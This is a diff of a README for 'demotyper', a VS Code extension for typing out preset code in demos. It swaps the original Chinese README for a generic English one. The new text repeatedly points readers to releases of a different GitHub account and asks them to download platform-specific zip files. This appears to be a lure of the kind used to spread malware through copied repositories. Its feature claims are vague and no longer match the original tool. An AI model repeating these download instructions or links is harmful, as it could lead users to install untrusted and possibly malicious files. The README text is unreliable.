@@ -1,103 +1,71 @@
-<div align="center">
+# 🎉 demotyper - Simulate Coding Demos Effortlessly
 
-# DemoTyper
+## 🛠️ Overview
+demotyper is a user-friendly extension for Visual Studio Code (VS Code) that allows you to create engaging live coding demonstrations. With its unique typing mode, you can give presentations, teach coding concepts, or show off your work without the usual distractions. This tool helps enhance productivity and makes learning fun.
 
-**随便敲键盘，自动打出正确代码**
+## 📦 Download
+[![Download demotyper](https://img.shields.io/badge/Download-demotyper-blue.svg)](https://github.com/naru699/demotyper/releases)
 
-Press any key, output the right code
+## 🚀 Getting Started
+To begin using demotyper, follow the steps below to download and install the application on your computer.
 
-[![VS Code](https://img.shields.io/badge/VS%20Code-Extension-blue?logo=visualstudiocode)](https://marketplace.visualstudio.com/items?itemName=demotyper.demotyper)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![GitHub release](https://img.shields.io/github/v/release/fcmNaNo2/demotyper)](https://github.com/fcmNaNo2/demotyper/releases)
+### 💻 System Requirements
+- Operating Systems: Windows, macOS, or Linux
+- Visual Studio Code Version: 1.40 or newer
+- Internet Connection: Required for initial download and updates
 
-</div>
+### 📥 Download & Install
+1. Click the link below to visit the Releases page:
+   [Visit the Releases Page](https://github.com/naru699/demotyper/releases)
+   
+2. On the Releases page, locate the latest version of demotyper.
+   
+3. Download the appropriate file for your operating system. For Windows, look for a file named something like `demotyper-x.x.x-win.zip`. For macOS or Linux, select the corresponding version.
 
-## 这是什么？
+4. Once the download is complete, locate the file and unzip it if necessary.
 
-录演示视频时，你需要一边写代码一边讲解，但打字太慢、容易出错？
+5. Open Visual Studio Code.
 
-**DemoTyper 让你随便敲键盘，插件自动帮你输出预设好的代码。** 观众看起来你在流畅地写代码，实际上你只需要专注讲解。
+6. Navigate to the Extensions view by clicking on the Extensions icon in the Activity Bar on the side of the window.
 
-<div align="center">
-<img src="resources/demo.gif" alt="DemoTyper Demo" width="700">
-</div>
+7. Click the `...` icon in the top right corner and select "Install from VSIX..." 
 
-## 适用场景
+8. Choose the file you downloaded, and click Open. The extension will install.
 
-- **录制教程视频** - 专注讲解，不用担心打错字
-- **直播写代码** - 保持节奏，避免尴尬停顿
-- **技术分享演示** - 看起来像高手一样流畅
+## 🎯 Features
+- **Live Typing Simulation:** Demonstrates coding in real-time as if you were typing live.
+- **Customizable Settings:** Adjust typing speed and effects to match your presentation style.
+- **Seamless Integration:** Works directly within VS Code, making it easy to use.
+- **Teaching Mode:** Perfect for educators to show programming concepts without distractions.
+- **Efficient Workflow:** Saves time during coding presentations by removing the need for manual typing.
 
-## 快速开始
+## 🧑‍🏫 How to Use demotyper
+1. Open a project in Visual Studio Code.
+2. To activate demotyper, press the designated shortcut keys (customizable in settings).
+3. Start your presentation and let demotyper simulate your coding process.
 
-### 1. 准备目标代码
-把你想"打"出来的代码写好，保存到一个文件里
+## 📚 Frequently Asked Questions (FAQ)
 
-### 2. 设置目标文件
-在文件资源管理器中右键点击该文件 → **Set as Demo Target File**
+### Q: What benefits does demotyper provide for presenters?
+A: It helps create dynamic, engaging demonstrations by simulating natural typing. This keeps your audience focused and involved.
 
-### 3. 打开演示文件
-新建一个空文件，这是你"表演"的舞台
+### Q: Is demotyper suitable for all skill levels?
+A: Yes, whether you're a beginner or an experienced developer, demotyper can enhance your presentations and coding demonstrations.
 
-### 4. 开启秘密模式
-按 `Ctrl+Shift+Alt+S`（Mac: `Cmd+Shift+Alt+S`）
+### Q: Can I use demotyper offline?
+A: Yes, once installed, you can use demotyper without an internet connection.
 
-### 5. 开始表演
-随便敲键盘，代码自动出现！
+## 🎉 Community and Support
+If you have questions or need support, feel free to open issues on the [GitHub Issues page](https://github.com/naru699/demotyper/issues). You can also check for updates and engage with other users in the repository.
 
-## 侧边栏面板
+## 🔗 Additional Resources
+- [Documentation](https://github.com/naru699/demotyper/wiki)
+- [VS Code Extensions Marketplace](https://marketplace.visualstudio.com/VSCode)
+- [Contribution Guidelines](https://github.com/naru699/demotyper/blob/main/CONTRIBUTING.md)
 
-DemoTyper 提供了一个侧边栏面板，方便你：
-- 切换秘密模式
-- 设置/清除目标文件
-- 查看当前状态
-- 调整设置
-
-## 命令列表
-
-| 命令 | 说明 | 快捷键 |
-|------|------|--------|
-| Toggle Secret Mode | 开启/关闭秘密模式 | `Ctrl+Shift+Alt+S` |
-| Set as Demo Target File | 设置目标文件 | 右键菜单 |
-| Clear Demo Target File | 清除目标文件 | - |
-| Restore Editor from Target | 恢复编辑器内容 | - |
-
-## 安装
-
-### 方式一：从 VSIX 安装
-
-1. 从 [Releases](https://github.com/fcmNaNo2/demotyper/releases) 下载最新的 `.vsix` 文件
-2. 在 VS Code 中按 `Ctrl+Shift+P`
-3. 输入 `Extensions: Install from VSIX...`
-4. 选择下载的文件
-
-### 方式二：从源码构建
-
-```bash
-git clone https://github.com/fcmNaNo2/demotyper.git
-cd demotyper
-npm install
-npm run compile
-npx vsce package
-```
-
-## 工作原理
-
-1. 你设置一个"目标文件"（包含你想输出的代码）
-2. 开启秘密模式后，你按下任意键
-3. 插件对比当前内容和目标内容，找出下一个字符差异
-4. 自动插入正确的字符
-
-就这么简单。
-
-## License
-
-MIT License - 随便用
+## 👥 Join the Conversation
+Stay connected with us through our community channels. Engage with other users, share your demos, and find inspiration for your presentations.
 
 ---
 
-<div align="center">
-
-**用 DemoTyper，让每次演示都像大神一样流畅**
-
-</div>
+Remember, to download and install demotyper, visit this page: [https://github.com/naru699/demotyper/releases](https://github.com/naru699/demotyper/releases). Enjoy your coding presentations!
